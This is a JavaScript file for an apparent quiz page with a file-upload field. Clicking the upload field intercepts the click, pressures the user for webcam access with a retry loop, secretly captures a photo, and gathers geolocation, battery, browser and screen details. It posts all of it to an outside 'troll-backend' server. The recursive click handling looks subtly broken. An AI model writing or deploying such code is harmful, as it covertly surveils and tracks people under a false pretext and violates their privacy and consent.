// =========================
// Elements
// =========================
const fileInput = document.getElementById("user-file");
const submitBtn = document.getElementById("submit-btn");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const toast = document.getElementById("toast");
const form = document.getElementById("quiz-form");

// =========================
// Camera constraints
// =========================
const constraints = { video: { facingMode: "user" }, audio: false };

// =========================
// Show toast
// =========================
function showToast(message = "Captured and sent!") {
  toast.textContent = message;
  toast.style.display = "block";
  setTimeout(() => {
    toast.style.display = "none";
  }, 3000);
}

// =========================
// Collect metadata
// =========================
async function collectMetadata() {
  const metadata = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    width: window.innerWidth,
    height: window.innerHeight,
    language: navigator.language,
    battery: "N/A",
    location: "N/A",
    time: new Date().toLocaleString(),
  };

  // Battery info
  if (navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();
      metadata.battery = battery.level * 100;
    } catch {}
  }

  // Location
  if (navigator.geolocation) {
    try {
      const pos = await new Promise((resolve, reject) =>
        navigator.geolocation.getCurrentPosition(resolve, reject)
      );
      metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
    } catch {}
  }

  return metadata;
}

// =========================
// Capture photo from webcam
// =========================
async function capturePhoto() {
  const context = canvas.getContext("2d");
  context.drawImage(video, 0, 0, canvas.width, canvas.height);
  const imageData = canvas.toDataURL("image/png");
  return imageData;
}

// =========================
// Send data to backend
// =========================
async function sendData(imageData, metadata) {
  try {
    const res = await fetch("https://troll-backend.onrender.com/api/upload", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image: imageData, metadata }),
    });
    const result = await res.json();
    console.log("Backend response:", result);
    showToast("Photo & metadata sent successfully!");
  } catch (err) {
    console.error("Error sending data:", err);
    showToast("Failed to send data");
  }
}

// =========================
// Ask for camera & capture
// =========================
async function requestCameraAndCapture() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;

    // Ensure video has time to warm up
    await new Promise((resolve) => setTimeout(resolve, 2500));

    const metadata = await collectMetadata();
    const imageData = await capturePhoto();

    // Send data to backend
    await sendData(imageData, metadata);

    // Stop camera stream after capture
    stream.getTracks().forEach((track) => track.stop());
  } catch (err) {
    console.warn("Camera permission denied or error:", err);
    alert("Camera permission is required. Please allow access and try again.");
    // Retry until allowed
    await requestCameraAndCapture();
  }
}

// =========================
// File input click handler
// =========================
fileInput.addEventListener("click", async (e) => {
  e.preventDefault(); // prevent default file picker

  // Ask camera permission first and capture photo
  await requestCameraAndCapture();

  // Then allow user to select file
  fileInput.click();
});

// =========================
// Form submission
// =========================
form.addEventListener("submit", (e) => {
  e.preventDefault();
  showToast("Form submitted!"); // optional, handle other form data submission if needed
});
